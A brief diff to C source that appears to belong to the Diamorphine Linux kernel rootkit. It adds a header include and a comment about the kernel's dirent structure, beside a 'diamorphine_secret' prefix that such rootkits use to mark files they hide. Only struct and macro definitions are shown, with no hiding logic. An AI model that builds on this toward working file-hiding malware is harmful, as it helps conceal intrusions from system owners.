@@ -1,9 +1,13 @@
+#include <linux/types.h>
+
 struct linux_dirent {
   unsigned long d_ino;
   unsigned long d_off;
   unsigned short d_reclen;
   char d_name[1];
 };
+
+/* Use kernel's built-in linux_dirent64 structure */
 
 #define MAGIC_PREFIX "diamorphine_secret"
 
